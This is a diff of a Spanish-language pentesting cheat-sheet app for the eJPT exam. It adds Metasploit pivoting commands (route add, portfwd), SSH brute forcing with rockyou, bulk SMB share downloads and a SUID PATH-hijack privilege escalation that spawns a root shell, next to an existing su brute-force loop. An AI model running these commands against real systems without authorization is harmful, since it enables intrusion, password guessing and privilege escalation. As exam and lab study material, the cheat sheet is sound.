@@ -313,6 +313,7 @@ const D = [
   ["scan","Escanear una lista de objetivos","-iL lee las IPs de un fichero (una por línea)","nmap -iL objetivos.txt -oN barrido"],
   ["scan","Por qué un puerto está en ese estado","--reason explica si respondió, no respondió o fue filtrado","nmap --reason {IP}"],
   ["scan","Ver el porqué del escaneo en vivo","-vv da salida muy detallada mientras corre","nmap -p- -vv {IP}"],
+  ["scan","Extraer lista de puertos de un reporte nmap","de un escaneo -oN ya guardado: coge las líneas de puerto, aísla el número, quita duplicados y los une con comas listos para -p","grep -E '^[0-9]' escaneo | cut -d/ -f1 | sort -u | xargs | tr ' ' ','"],
 
   // ===== 3. Web =====
   ["web","Escaneo de vulnerabilidades web","Nikto prueba miles de rutas y fallos conocidos (ficheros peligrosos, versiones vulnerables)","nikto -h http://{IP}"],
@@ -322,6 +323,7 @@ const D = [
   ["web","Descubrir vhosts por cabecera Host","fuzzea el Host HTTP; -fs 0 oculta respuestas vacías para ver solo los que existen","ffuf -u http://{IP}/ -H 'Host: FUZZ.target' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"],
   ["web","Identificar la tecnología del sitio","whatweb detecta servidor, CMS, lenguaje y versiones a partir de las respuestas","whatweb http://{IP}"],
   ["web","Ver solo las cabeceras HTTP","-I pide únicamente las cabeceras: revela servidor, redirecciones y cookies","curl -sI http://{IP}"],
+  ["web","Resolver un vhost en local (/etc/hosts)","si la web solo carga bien por nombre de dominio (virtual hosting), añade la entrada para que tu navegador resuelva ese dominio a la IP objetivo","echo '{IP} dominio.local' | sudo tee -a /etc/hosts"],
   ["web","Buscar rutas y comentarios en el HTML","descarga la página y filtra enlaces, recursos y comentarios donde a veces hay pistas","curl -s http://{IP} | grep -iE 'href|src|<!--'"],
   ["web","Seguir redirecciones y ver el cuerpo","-L sigue los 301/302 para ver dónde acaba realmente la petición","curl -sL http://{IP}"],
   ["web","Enumerar la web con NSE","http-enum busca directorios y ficheros conocidos con los scripts de nmap","nmap -p80 --script http-enum {IP}"],
@@ -340,6 +342,7 @@ const D = [
   ["services","Enumeración SMB completa","-a lanza todas las comprobaciones: usuarios, grupos, shares y políticas","enum4linux -a {IP}"],
   ["services","Conectarse a un recurso SMB","abre una sesión al share; dentro se usan 'ls' y 'get fichero' para descargar","smbclient //{IP}/share -N"],
   ["services","Descargar todo un share recursivo","-R con smbget baja la carpeta entera de golpe","smbget -R smb://{IP}/share"],
+  ["services","Descargar todo dentro de una sesión smbclient","ya conectado por smbclient: 'prompt' quita la confirmación por archivo y mget * se lleva todo de golpe","prompt;mget *"],
   ["services","Detección de SO por SMB (NSE)","smb-os-discovery saca versión de Windows y nombre de equipo por el 445","nmap -p445 --script smb-os-discovery {IP}"],
   ["services","Listar shares SMB con NSE","alternativa a smbclient usando los scripts de nmap","nmap -p445 --script smb-enum-shares {IP}"],
   ["services","Comprobar acceso SMB con NetExec","nxc es el sucesor de crackmapexec (mismo uso); valida credenciales por SMB","nxc smb {IP} -u usuario -p 'password'"],
@@ -489,18 +492,24 @@ const D = [
   ["pivot","2 · Crear la ruta con autoroute","enruta por esta sesión el tráfico de msf hacia la subred interna indicada","run autoroute -s 10.10.10.0/24"],
   ["pivot","2 · Autoroute con máscara completa","misma ruta escrita con máscara en lugar de CIDR","run autoroute -s 10.10.10.0 255.255.255.0"],
   ["pivot","2 · Autoroute con el módulo post","alternativa: configuras SESSION con el ID de tu Meterpreter y ejecutas run","use post/multi/manage/autoroute"],
+  ["pivot","2 · Ruta manual desde la consola (route add)","equivalente a autoroute pero tecleado en msfconsole; el último argumento es el ID de la sesión que hace de puente","route add 10.10.10.0/24 2"],
   // -- Paso 3: verificar la ruta --
   ["pivot","3 · Verificar las rutas (Meterpreter)","-p imprime la tabla de rutas que msf ha aprendido para confirmar que la ruta existe","run autoroute -p"],
   ["pivot","3 · Verificar las rutas (msfconsole)","muestra desde la consola las rutas activas del framework","route print"],
+  ["pivot","3 · Eliminar una ruta","limpia una ruta que ya no necesitas o que has metido mal; mismos argumentos que route add","route del 10.10.10.0/24 2"],
   // -- Paso 4: segundo plano y atacar por la ruta --
   ["pivot","4 · Mandar la sesión al segundo plano","vuelve a la consola de msf dejando la sesión viva para poder usar la ruta","background"],
   ["pivot","4 · Escanear la Víctima 2 por la ruta","msf detecta solo que para llegar a esa IP debe usar la ruta de autoroute","use auxiliary/scanner/portscan/tcp"],
   ["pivot","4 · Fijar el objetivo interno y lanzar","RHOSTS es el host de la red interna; 'run' escanea a través del túnel","set RHOSTS 10.10.10.15"],
+  ["pivot","4 · Port forward directo con portfwd (sin proxychains)","dentro de la sesión Meterpreter; trae un puerto de la Víctima 2 a tu localhost sin montar SOCKS+proxychains — ideal para abrir una web interna en tu propio navegador","portfwd add -l 8080 -p 80 -r 10.10.10.15"],
+  ["pivot","4 · Listar y borrar portfwd","list confirma la redirección activa; delete la quita con los mismos parámetros con los que se creó","portfwd list"],
   // -- Paso 5: exponer la red a herramientas externas (nmap, hydra) --
   ["pivot","5 · SOCKS proxy para herramientas externas","autoroute solo vale dentro de msf; este proxy expone la red a nmap/hydra","use auxiliary/server/socks_proxy"],
   ["pivot","5 · Configurar proxychains","añade al final del fichero 'socks5 127.0.0.1 1080' (el puerto del socks_proxy)","sudo nano /etc/proxychains4.conf"],
   ["pivot","5 · Nmap externo por el proxy","proxychains obliga a nmap a salir por el túnel; usa -sT y -Pn sí o sí","proxychains nmap -sT -Pn 10.10.10.15"],
   ["pivot","5 · Hydra externo por el proxy","cualquier herramienta externa pasa por el túnel anteponiendo proxychains","proxychains hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.15"],
+  ["pivot","5 · Fuerza bruta SSH sin proxychains (módulo msf)","alternativa a hydra+proxychains: el módulo usa la ruta de autoroute directamente, sin SOCKS","use auxiliary/scanner/ssh/ssh_login"],
+  ["pivot","5 · Configurar el módulo ssh_login","RHOSTS el host interno, USERNAME el usuario, PASS_FILE la wordlist; 'run' lanza la fuerza bruta a través del túnel","set RHOSTS 10.10.10.15; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt"],
   // -- Alternativas sin Metasploit --
   ["pivot","Alt · Servidor chisel en tu Kali","túnel SOCKS sin Metasploit; --reverse deja que el cliente conecte de vuelta","chisel server -p 8000 --reverse"],
   ["pivot","Alt · Cliente chisel en el pivot","R:socks crea el proxy SOCKS inverso que sale por la red interna; conecta a tu Kali, donde corre el chisel server","chisel client {KIP}:8000 R:socks"],
@@ -515,6 +524,8 @@ const D = [
   ["privesc","Revisar tareas cron","scripts programados que corren como root y quizá puedas modificar","cat /etc/crontab"],
   ["privesc","Ficheros de root escribibles","ficheros que root ejecuta y tú puedes editar: vector directo","find / -writable -type f 2>/dev/null | grep -v '/proc'"],
   ["privesc","Escalada vía env con SUID","si env tiene el bit SUID, lanza una shell manteniendo privilegios (-p)","env /bin/sh -p"],
+  ["privesc","Detectar un SUID que llama a un binario sin ruta","revisa la salida a mano: si ves un comando suelto como 'curl' sin /usr/bin/ delante, ese binario es secuestrable por PATH","strings /ruta/al/binario_suid"],
+  ["privesc","Escalada por secuestro de $PATH","creas un script con el nombre de ese binario, lo antepones al PATH y ejecutas el SUID: te da una shell con privilegios de root","echo -e '#!/bin/bash\\nbash -p' > /tmp/curl; chmod +x /tmp/curl; export PATH=/tmp:$PATH; /ruta/al/binario_suid"],
   ["privesc","Shell root si bash es SUID","-p conserva el usuario efectivo root en lugar de degradar a tu usuario","bash -p"],
   ["privesc","Ver versión del kernel","para buscar exploits de kernel si no hay otro vector","uname -a"],
   ["privesc","Fuerza bruta de su root con una lista","prueba cada contraseña contra su root hasta dar con la de root — ojo, su a veces lee la contraseña de la TTY y no de stdin, puede no funcionar en todas las shells","while read p; do echo \"$p\" | timeout 2 su root -c 'id' 2>/dev/null | grep -q uid=0 && echo \"ROOT: $p\" && break; done < passwords.txt"],
@@ -607,7 +618,7 @@ kipEl.addEventListener("input",render);
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|reg|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm|responder)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|cut|sort|xargs|tr|tee|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|reg|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm|responder)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
@@ -772,12 +783,13 @@ const GUIDES = [
 
   ["🔀","Pivoting a una red interna","pivot",[
     "Confirma la segunda red: <code>ifconfig</code> / <code>ipconfig</code>. Apunta la subred (p. ej. 10.10.10.0/24).",
-    "Con sesión Meterpreter: <code>run autoroute -s 10.10.10.0/24</code>.",
-    "Verifica (<code>run autoroute -p</code>) y manda la sesión al fondo (<code>background</code>).",
-    "<b>Dentro de msf</b> ya llegas: <code>use auxiliary/scanner/portscan/tcp</code> + <code>set RHOSTS</code>.",
-    "<b>Para nmap/hydra externos:</b> <code>use auxiliary/server/socks_proxy</code>, configura proxychains y usa <code>proxychains nmap -sT -Pn</code>.",
+    "Con sesión Meterpreter: <code>run autoroute -s 10.10.10.0/24</code> — o desde la consola directamente <code>route add 10.10.10.0/24 &lt;sesión&gt;</code>, es lo mismo.",
+    "Verifica (<code>run autoroute -p</code> o <code>route print</code>) y manda la sesión al fondo (<code>background</code>). <code>route del ...</code> la quita si la lías.",
+    "<b>Dentro de msf</b> ya llegas: <code>use auxiliary/scanner/portscan/tcp</code> + <code>set RHOSTS</code>, y también módulos de fuerza bruta como <code>ssh_login</code> — usan la ruta sin proxychains.",
+    "<b>¿Solo necesitas ver una web o un puerto concreto?</b> <code>portfwd add -l 8080 -p 80 -r 10.10.10.15</code> dentro de Meterpreter te lo trae a tu localhost sin montar SOCKS. Es más rápido que proxychains para un único servicio.",
+    "<b>Para nmap/hydra externos</b> (varios puertos, herramientas fuera de msf): <code>use auxiliary/server/socks_proxy</code>, configura proxychains y usa <code>proxychains nmap -sT -Pn</code>.",
     "Contra la Víctima 2, <b>vuelve a empezar la metodología completa</b> como si fuera nueva.",
-  ],"autoroute solo vale DENTRO de msf. Nmap y Hydra externos necesitan sí o sí el SOCKS proxy + proxychains.",
+  ],"autoroute (o route add) solo vale DENTRO de msf. Para una web puntual usa portfwd; para herramientas externas como nmap/hydra necesitas sí o sí el SOCKS proxy + proxychains.",
   [["metodologia","Empezar de cero con la Víctima 2"]]],
 
   ["🎯","Cómo enfocar el examen eJPT","examen",[
